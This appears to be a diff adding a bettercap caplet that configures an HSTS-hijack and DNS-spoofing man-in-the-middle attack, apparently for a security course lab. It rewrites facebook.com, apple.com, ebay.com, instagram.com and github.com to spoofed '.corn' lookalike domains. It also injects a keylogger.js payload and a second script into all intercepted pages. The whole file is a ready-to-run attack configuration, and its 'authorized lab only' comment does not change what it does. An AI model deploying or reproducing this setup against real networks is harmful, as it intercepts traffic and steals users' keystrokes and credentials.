@@ -1,0 +1,26 @@
+# hstshijack_custom.cap
+# Last Edited by Charles Duoto on November 17, 2026
+# Custom HSTS hijack + DNS spoof caplet for lab use.
+# Based on the course image's hstshijack setup.
+# Authorized lab environments only.
+#
+# Usage:
+#   bettercap -iface eth0 -caplet hstshijack_custom.cap
+#   (or add it as an option in the launcher)
+
+# HSTS hijack settings
+set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore          *
+set hstshijack.targets         facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com,instagram.com,*.instagram.com,github.com,*.github.com
+set hstshijack.replacements    facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,instagram.corn,*.instagram.corn,github.corn,*.github.corn
+set hstshijack.obfuscate       false
+set hstshijack.encode          false
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js, *:/root/Vibe_Coded_Scripts/HaxVibez/hack_alert.js
+
+# Proxy script and DNS spoof domains
+set http.proxy.script          /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set dns.spoof.domains          facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,instagram.corn,*.instagram.corn,github.corn,*.github.corn
+
+# Enable modules
+http.proxy on
+dns.spoof on
